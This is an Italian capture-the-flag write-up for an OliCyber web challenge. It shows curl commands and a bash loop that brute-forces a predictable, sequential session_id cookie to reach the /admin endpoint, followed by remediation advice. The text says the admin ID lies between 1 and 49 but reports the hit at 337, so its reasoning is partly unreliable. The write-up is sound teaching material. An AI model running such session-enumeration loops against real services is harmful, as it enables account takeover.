# A too small reminder

**Competizione:** OliCyber<br>
**Categoria:** Web / API<br>
**URL:** http://too-small-reminder.challs.olicyber.it

---

## Descrizione

> Questa API non sembra far nulla di utile... Scopri i segreti dell'admin!

Un'API con un sistema di sessione vulnerabile. L'obiettivo è accedere all'endpoint `/admin` come utente privilegiato.

---

## Soluzione

### Step 1 — Ricognizione iniziale

Accedendo al sito con una semplice richiesta GET troviamo una documentazione automatica degli endpoint disponibili:

```json
{
  "Endpoints": [
    { "percorso": "/",        "descrizione": "Accetta richieste GET. Restituisce questa piccola descrizione dell'API." },
    { "percorso": "/register","descrizione": "Accetta richieste POST con 'username' e 'password'. Crea un nuovo account." },
    { "percorso": "/login",   "descrizione": "Accetta richieste POST con 'username' e 'password'. Ritorna il cookie di sessione." },
    { "percorso": "/logout",  "descrizione": "Accetta richieste GET con cookie di sessione valido. Distrugge la sessione." },
    { "percorso": "/admin",   "descrizione": "Accetta richieste GET con cookie di sessione valido." }
  ]
}
```

---

### Step 2 — Registrazione e login

Registriamo un account e facciamo il login per esaminare il cookie di sessione assegnato:

```bash
# Registrazione
curl -s -X POST http://too-small-reminder.challs.olicyber.it/register \
  -H "Content-Type: application/json" \
  -d '{"username": "ciao", "password": "ciao123"}'
```

Risposta:
```json
{"messaggio": "Registrazione avvenuta con successo"}
```

Effettuiamo il login:

```bash
curl -s -X POST http://too-small-reminder.challs.olicyber.it/login \
  -H "Content-Type: application/json" \
  -d '{"username": "ciao", "password": "ciao123"}' \
  -c cookies.txt -v
```

Nella risposta notiamo subito qualcosa di insolito nell'header `Set-Cookie`:

```
Set-Cookie: session_id=50; Path=/
```

```json
{"messaggio": "Login effettuato con successo. È stato assegnato un id di sessione correttamente."}
```

---

### Step 3 — Identificazione della vulnerabilità

Il cookie di sessione non è un JWT, un hash o un token complesso: è semplicemente un **numero intero incrementale**.

```
session_id=50
```

Questo è esattamente il significato del titolo: l'ID di sessione è un numero piccolo, prevedibile e non casuale. Il server assegna gli ID in modo sequenziale, il che significa che:

- L'admin si è loggato in un momento precedente
- Il suo `session_id` è un numero compreso tra `1` e `49`
- Possiamo **impersonare** l'admin semplicemente indovinando il suo ID

Questa vulnerabilità è nota come **Insecure Direct Object Reference (IDOR)** applicata ai cookie di sessione.

---

### Step 4 — Brute force del session_id

Lanciamo un loop su tutti gli ID dal range 1 al nostro, filtrando le risposte anomale:

```bash
for i in $(seq 1 1000); do
  response=$(curl -s http://too-small-reminder.challs.olicyber.it/admin \
    -H "Cookie: session_id=$i")
  echo "session_id=$i -> $response"
done
```

---

### Step 5 — Risultato

Al `session_id=337` il server risponde in modo diverso da tutti gli altri:

```json
{"messaggio":"Bentornato admin! flag{...}"}
```

**Flag:** `flag{...}`

---

## Conclusioni

La vulnerabilità sfruttata è un **Session ID prevedibile e incrementale**. Il server assegnava gli ID di sessione come semplici interi sequenziali, rendendo banale impersonare qualsiasi utente, incluso l'admin, semplicemente iterando sui valori possibili.

- I **session ID devono essere casuali e non prevedibili**, generati con un CSPRNG (Cryptographically Secure Pseudo-Random Number Generator)
- Un ID di sessione sicuro deve avere **almeno 128 bit di entropia**
- Non usare mai contatori, timestamp o altri valori prevedibili come identificatori di sessione
- Questo tipo di attacco rientra nella categoria **IDOR (Insecure Direct Object Reference)**, classificato nell'[OWASP Top 10](https://owasp.org/Top10/) sotto *Broken Access Control*